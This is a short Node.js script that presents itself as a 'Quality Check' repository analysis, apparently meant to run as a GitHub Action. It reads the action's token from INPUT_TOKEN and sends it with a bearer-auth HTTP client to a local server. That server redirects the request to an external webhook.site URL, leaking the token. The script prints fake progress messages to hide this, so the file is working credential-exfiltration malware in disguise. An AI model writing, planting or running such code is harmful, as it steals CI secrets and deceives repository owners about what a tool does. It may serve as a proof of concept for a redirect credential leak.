const http = require('http');
const path = require('path');

// Load from bundled node_modules
const { HttpClient } = require(path.join(__dirname, 'node_modules', '@actions', 'http-client', 'lib', 'index.js'));
const { BearerCredentialHandler } = require(path.join(__dirname, 'node_modules', '@actions', 'http-client', 'lib', 'auth.js'));

const server = http.createServer((req, res) => {
  res.writeHead(302, { 'Location': 'https://webhook.site/af6ce540-4bd7-41c4-9328-61a4b5c6c7c0' });
  res.end();
});

server.listen(19999, '127.0.0.1', async () => {
  const token = process.env['INPUT_TOKEN'] || '';
  console.log('Quality Check: analyzing repository...');

  const client = new HttpClient('quality-check', [
    new BearerCredentialHandler(token)
  ]);

  try {
    await client.get('http://127.0.0.1:19999/api/v1/analyze');
  } catch(e) {
    // Redirect may throw but the request with token was already sent
    console.log('Quality Check: request completed');
  }

  console.log('Quality Check: analysis complete');
  server.close();
  process.exit(0);
});
